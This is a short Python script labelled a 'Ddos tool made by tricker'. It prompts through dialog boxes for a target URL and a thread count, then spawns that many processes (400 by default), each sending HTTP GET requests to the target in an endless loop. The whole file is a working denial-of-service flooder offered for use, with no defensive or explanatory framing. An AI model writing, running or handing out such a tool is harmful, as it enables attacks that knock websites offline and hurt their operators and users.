from os import system
import requests
import time
from multiprocessing import Process as P

system('dialog --title \'Ddos tool made by tricker\' --inputbox \'Enter url \' 10 40 2> url')
            #system('dialog --msgbox \'your url is :\''+u.read()+' 5 50')
system('dialog --title \'Ddos tool made by tricker\' --inputbox \'Enter thread(default 400) \' 10 40 2> thread')
system('clear')
with open('url', 'r') as u:
    ure = u.read()
    with open('thread', 'r') as r:
        thr = r.read()
        system('dialog --title \'Ddos tool made by tricker\' --msgbox \'url :'+ure+'\nThread :'+thr+'\nport :80\' 20 50')
        system('clear')
        def main():
            p = requests.get(ure)
            print(p)

        def attack():
            while True:
                main()

        for i in range(int(thr)):
            t=P(target=attack)
            t.start()
    
    
            

            
            
            
